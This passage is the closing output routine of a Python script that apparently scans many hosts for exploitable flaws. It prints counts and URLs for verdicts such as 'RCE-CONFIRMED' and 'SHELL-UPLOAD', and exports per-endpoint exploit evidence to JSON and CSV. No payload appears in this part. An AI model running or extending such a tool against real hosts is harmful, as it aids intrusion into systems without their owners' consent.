              "OOM-RECOVERY", "STALE-STATE", "OOM-TRIGGERED", "CRASH"]:
        if bucket.get(v):
            print(f"[SUMMARY] {v:14}: {len(bucket[v])}")
    for v in ("RCE-CONFIRMED", "RCE-VIA-STALE", "STALE-CONTROL", "SHELL-UPLOAD"):
        for host, url in bucket.get(v, []):
            print(f"   [{v}] {url}")

    if args.output:
        with open(args.output, "w", encoding="utf-8") as f:
            json.dump(results, f, indent=2, ensure_ascii=False)
        print(f"\n[*] JSON -> {args.output}")
    if args.csv:
        with open(args.csv, "w", newline="", encoding="utf-8") as f:
            w = csv.writer(f)
            w.writerow(["host", "endpoint", "verdict", "evidence"])
            for r in results:
                for x in r.get("exploit", []):
                    w.writerow([r.get("final_url", r["target"]), x["url"],
                                x["verdict"], " | ".join(x["evidence"])])
        print(f"[*] CSV  -> {args.csv}")


if __name__ == "__main__":
    main()